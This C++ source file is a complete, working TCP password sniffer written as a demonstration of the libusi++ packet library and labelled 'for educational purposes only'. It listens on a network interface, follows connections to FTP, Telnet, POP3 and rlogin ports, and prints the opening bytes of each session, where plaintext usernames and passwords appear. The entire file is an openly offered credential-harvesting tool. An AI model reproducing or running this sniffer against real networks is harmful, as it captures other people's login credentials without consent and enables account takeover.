/*** TCP password sniffer for TELNET, FTP, POP3 and RLOGIN service.
 *** Demonstration of the power of libusi++.
 *** FOR EDUCATIONAL PURPOSES ONLY!
 *** licensed under the GPL. author: krahmer@cs.uni-potsdam.de
 ***/
// rather lame piece of code. :)
#include <usi++/usi++.h>
#include <iostream>
#include <string>
#include <vector>

//using namespace std;

#define MAXDATALEN 1000

/* a unique connection
 */
typedef struct {
	long seq, src, dst;
	int sport, dport, count, lwm;
	char buf[MAXDATALEN];
} connection;

vector<connection*> conn;

#define min(x,y) ((x)<(y)?(x):(y))

/* look whether the opened connection starts from
 * a xterm.
 */
bool fromX(connection *c)
{
	char *s = new char[c->count+1];
	memset(s, 0, c->count + 1);
	bool r;
	
	int j = 0;
	
	/* skip 0-bytes, so a strstr() works now */
	for (int i = 0; i < c->count; i++) {
		if (c->buf[i])
			s[j++] = c->buf[i];
	}
	if (strstr(s, "xterm") != NULL ||
	    strstr(s, "XTERM") != NULL) 
		r = true;
	else
		r = false;
	delete [] s;
	return r;
}

int print_conn(connection *c, int j)
{
	char src[1000], dst[1000];
	
	if (!c)
		return 0;

	/* set lwm higher, if connection comes from xterm 
	 * and lwm was not already increased.
	 */
	if (fromX(c) && c->lwm < 160) {
		c->lwm += 50;
		return 0;
	}
		
	/* This is a dummy. We use it to resolve the
	 * source and destinationadresses
	 */
	UDP dummy("localhost");
	dummy.set_src(c->src);
	dummy.set_dst(c->dst);
	cout<<dummy.get_src(0, src, 1000)<<":"<<c->sport<<"->"
	    <<dummy.get_dst(0, dst, 1000)<<":"<<c->dport<<endl;
	
	/* now print data in readable format
	 */
	for (int i = 0; i < c->count && i < MAXDATALEN; i++) {
		if (isprint(c->buf[i]) || c->buf[i] == '\n')
			printf("%c", c->buf[i]); 
		fflush(stdout);
	}
	printf("\n");
	
	/* this connection is not longer needed
	 */
	conn[j] = NULL;
	delete c;
	return 0;
}

/* Add a new connection
 */
int add_conn(TCP *tcp)
{
	int p = tcp->get_dstport();
	
	if (p != 21 && p != 23 && p != 110 && p != 513)
		    return -1;
		    
	connection *c = new connection;
	memset(c, 0, sizeof(connection));
	c->src = tcp->get_src();
	c->dst = tcp->get_dst();
	c->sport = tcp->get_srcport();
	c->dport = tcp->get_dstport();

	/* set the low-watermark -- port specific
	 */
	switch (c->dport) {
	case 21:
		c->lwm = 30;
		break;
	case 23:
		c->lwm = 260;
		break;
	case 110:
		c->lwm = 30;
		break;
	case 513:
		c->lwm = 55;
		break;
	default:
		c->lwm = 100;
		break;
	}
	conn.push_back(c);
	return 0;
}


connection *get_conn(TCP *tcp)
{
	for (int i = 0; i < conn.size(); i++) {
		if (!conn[i])
			continue;
		if (tcp->get_dst() == conn[i]->dst && tcp->get_src() == conn[i]->src &&
		    tcp->get_dstport() == conn[i]->dport && tcp->get_srcport() == conn[i]->sport)
			return conn[i];
	}
	return NULL;
}
	

int main(int argc, char **argv)
{
   	
        if (argc < 2) {
           	cout<<argv[0]<<" [intf]\n";
		exit(1);
        }
        TCP *sn = new TCP("127.0.0.1");
        
        sn->init_device(argv[1], 1, 500);
        char buf[1000];
	
        while (1) {
           	memset(buf, 0, 1000);
           	int l = sn->sniffpack(buf, 1000);

		/* if connection is opened, save characteristics
		 */
		if (sn->get_flags() == TH_SYN) {
			add_conn(sn);
		
		/* otherwise save data
		 */
		} else {
			/* don't fetch the ACK only packets 
			 */
			if (sn->get_flags() == TH_ACK)
				continue;
			connection *c = get_conn(sn);
			if (!c)
				continue;	
			
			/* insert data
			 */
			int j = 0;

			while (l-- > 0 && c->count < MAXDATALEN) 
				c->buf[c->count++] = buf[j++];
		}
		
		/* look if one connection has enough data
		 */
		for (int i = 0; i < conn.size(); i++) {
			/* skip already printed  connections
			 */
			if (!conn[i])
				continue;
			if (conn[i]->count > conn[i]->lwm)
				print_conn(conn[i], i);
                }
        }
        return 0;
}
